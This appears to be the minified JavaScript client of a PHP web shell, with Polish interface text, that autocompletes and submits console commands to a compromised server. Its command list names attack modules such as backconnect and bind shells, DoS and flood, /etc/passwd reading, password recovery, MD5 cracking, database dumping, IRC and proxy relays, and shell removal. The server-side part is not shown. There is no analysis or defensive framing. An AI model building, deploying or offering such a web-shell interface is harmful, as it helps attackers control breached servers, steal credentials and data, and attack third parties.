<script>function autoPrompt(a){var b="";aParametrs=a.split(" ");a=aParametrs[0].trim();if(a!=""){for(i in aCommands){if(aCommands[i].substring(0,a.length)==a){b+="<span onclick=\"changeCommand('"+aCommands[i]+"');\">";b+='<span class="red">';b+=aCommands[i].substring(0,a.length);b+="</span>";b+=aCommands[i].substring(a.length);b+="</span>, "}}}if(b==""){b="<em>Brak</em>"}oPrompt.innerHTML="<strong>Dostępne polecenia:</strong> "+b;var c=oPrompt.getElementsByTagName("span");for(i=0;i<c.length;++i){sName=c[i].getAttribute("onclick");if(sName!=null){c[i].style.cursor="pointer"}}}function changeCommand(a){oCmd.value=":"+a+" ";autoPrompt(a)}function event(a,b,c){if(a.attachEvent){a.attachEvent(b,c)}else if(a.addEventListener){a.addEventListener(b,c)}}function submitForm(){var a=document.getElementById("cmd");if(document.getElementById("cmd-send").getAttribute("value")=="Execute"&&!isExclude(a.value)){oStatus.style.display="block";var b=new XMLHttpRequest;b.open("POST","",true);b.setRequestHeader("X-Requested-With","XMLHttpRequest");b.setRequestHeader("Content-Type","application/x-www-form-urlencoded");b.onreadystatechange=function(){if(b.readyState==4){document.getElementById("console").innerHTML=b.responseText;oStatus.style.display="none"}};b.send("cmd="+escape(a.value));return false}return true}function isExclude(a){for(i=0;i<aExclude.length;++i){if(a.substring(1,aExclude[i].length+1)==aExclude[i]){return true}}return false}window.onload=function(){var a=document.getElementById("console");var b=innerHeight-320;var c=(b<100?100:b)+"px";a.style.minHeight=c;a.style.height=c};var aExclude=new Array("edit","upload","down","download","get","logout","bind","mysqldump","mysqldumper","mysqlbackup","passwordrecovery","pr","dos","flood","backconnect","bc","irc","proxy","emailvalidator");var aCommands=new Array("help","modules","edit","upload","system","exec","info","mysql","cd","bind","pwd","remove","rm","delete","del","pack","unpack","exit","mysqldump","mysqldumper","mysqlbackup","ftpdownload","ftpdown","ftpget","mv","move","passwordrecovery","pr","logout","ftpupload","ftpup","ftpput","eval","php","dos","flood","g4m3","hexdump","hd","cat","backconnect","bc","socketupload","socketup","socketput","cp","copy","echo","chmod","mail","email","sendmail","mkdir","download","down","get","bcat","b64","etcpasswd","revip","socketdownload","socketdown","socketget","md5crack","irc","ping","ls","proxy","phpinfo","destroy","removeshell","emailvalidator");var oBody=document.getElementsByTagName("body")[0];if(navigator.appName=="Microsoft Internet Explorer"){oBody.innerHTML='<h1 style="text-align: center; margin-top: 60px">Twoja przeglądarka jest do dupy, wymień ją na coś lepszego: Opera, Chrome, Firefox</h1>'}var oStatus=document.createElement("div");oStatus.setAttribute("id","status");oStatus.innerHTML=" ";oStatus.style.display="none";oBody.appendChild(oStatus);var oForm=document.getElementsByTagName("form")[0];oForm.setAttribute("onsubmit","return submitForm();");var oCmd=document.getElementById("cmd");var oPrompt=document.createElement("div");oPrompt.setAttribute("id","prompt");oPrompt.setAttribute("style","text-align: left; padding-left: 25px");oPrompt.innerHTML="<strong>Dostępne polecenia:</strong> <em>Brak</em>";oForm.appendChild(document.createElement("br"));oForm.appendChild(document.createElement("br"));oForm.appendChild(oPrompt);autoPrompt(oCmd.value.substring(1));event(oCmd,"keyup",function(){if(oCmd.value.length>1&&oCmd.value.substring(0,1)==":"){autoPrompt(oCmd.value.substring(1))}else{oPrompt.innerHTML="<strong>Dostępne polecenia:</strong> <em>Brak</em>"}})</script>